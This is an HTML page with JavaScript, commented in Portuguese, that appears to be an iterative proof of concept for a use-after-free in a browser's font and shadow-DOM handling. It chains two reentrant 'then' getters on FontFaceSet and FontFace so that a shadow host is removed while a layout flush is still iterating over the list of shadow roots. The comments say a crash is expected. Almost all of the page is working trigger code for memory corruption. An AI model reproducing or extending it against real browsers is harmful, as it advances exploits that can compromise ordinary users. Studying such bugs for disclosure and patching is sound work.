
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<pre id="log"></pre>
<script>
// V6: Cascata de dois níveis de reentrada
//
// Nível 1: FontFaceSet.prototype.then (async via data URL)  ← já confirmado
//   → força layout → flushPendingDescendantUpdates() ativo
//     → Nível 2: FontFace.prototype.then (sync via local font) ← confirmado em 5 UAFs
//       → host.remove() COM iterador ativo → UAF!

function log(s) {
    document.getElementById('log').textContent += s + '\n';
}

document.fonts;

// === HOST PRINCIPAL: data URL longa → trigger async FontFaceSet.prototype.then ===
var host = document.createElement('div');
document.body.appendChild(host);
var shadow = host.attachShadow({ mode: 'open' });

var dataUrl = 'data:font/woff;base64,' + 'A'.repeat(150000);
var style1 = document.createElement('style');
style1.textContent =
    '@font-face { font-family: asyncFont; src: url("' + dataUrl + '"); }' +
    '.p1 { font: 24px asyncFont; }';
shadow.appendChild(style1);
var span1 = document.createElement('span');
span1.className = 'p1'; span1.textContent = 'async';
shadow.appendChild(span1);

document.body.offsetHeight;
document.fonts.load('24px asyncFont', 'A');
document.fonts.ready;

// Cria pendencia UpdateType::ActiveSet no shadow de host
var prepStyle = document.createElement('style');
prepStyle.textContent = '.unused1 { color: red; }';
shadow.prepend(prepStyle);
log('setup host (async). status=' + document.fonts.status);

// === HOST2: local font → trigger sync FontFace.prototype.then durante o flush ===
// Será criado DENTRO do getter de nível 1 para garantir que está "fresco"

var innerGetterCount = 0;

// === GETTER NÍVEL 1: FontFaceSet.prototype.then (async) ===
Object.defineProperty(FontFaceSet.prototype, 'then', {
    configurable: true,
    get: function() {
        delete FontFaceSet.prototype.then;
        log('=== GETTER N1 (FontFaceSet async) disparou! ===');
        log('N1 status: ' + document.fonts.status);

        // Cria host2 com local font + pendencia para o flush
        var host2 = document.createElement('div');
        document.body.appendChild(host2);
        var shadow2 = host2.attachShadow({ mode: 'open' });

        var style2 = document.createElement('style');
        // local(Helvetica): fonte do sistema, resolve rapidamente/sincronamente
        style2.textContent =
            '@font-face { font-family: syncFont; src: local(Helvetica); }' +
            '.p2 { font: 24px syncFont; }';
        shadow2.appendChild(style2);
        var span2 = document.createElement('span');
        span2.className = 'p2'; span2.textContent = 'sync';
        shadow2.appendChild(span2);

        document.body.offsetHeight; // forca carregamento de syncFont
        document.fonts.load('24px syncFont', 'A');

        // Materializa face.loaded da syncFont
        document.fonts.forEach(function(f) {
            var fam = f.family.trim().replace(/['"]/g, '');
            if (fam === 'syncFont') {
                void f.loaded;
                log('N1 syncFont encontrada, status: ' + f.status);
            }
        });

        // Cria pendencia UpdateType::ActiveSet em shadow2
        var prepStyle2 = document.createElement('style');
        prepStyle2.textContent = '.unused2 { color: blue; }';
        shadow2.prepend(prepStyle2);

        // === GETTER NÍVEL 2: FontFace.prototype.then (confirmado em 5 UAFs) ===
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get: function() {
                delete FontFace.prototype.then;
                ++innerGetterCount;
                log('>>> GETTER N2 (FontFace sync) disparou! family='
                    + (this.family || '?') + ' status=' + (this.status || '?'));
                // UAF: host.remove() com flushPendingDescendantUpdates() na call stack
                // O flush está iterando m_inDocumentShadowRoots,
                // e host está nessa lista → liberar o nó → crash esperado
                log('N2 chamando host.remove()...');
                host.remove();
                log('N2 apos host.remove() — sem crash ate aqui');
                return undefined;
            }
        });

        log('N1 getters instalados, forçando layout...');
        // Este layout dispara flushPendingDescendantUpdates()
        // que itera host E host2 em m_inDocumentShadowRoots
        // Ao processar host2 (syncFont local), FontFace.prototype.then pode disparar
        // enquanto o iterador ainda está na lista → host.remove() = UAF
        document.body.offsetHeight;

        log('N1 apos layout: innerGetter=' + innerGetterCount);
        return undefined;
    }
});

log('N1 getter instalado. aguardando async...');

Promise.resolve().then(function() {
    log('microtask: getter N1=' +
        (typeof FontFaceSet.prototype.then === 'undefined' ? 'ja disparou' : 'pendente'));
});
</script>
</body>
</html>
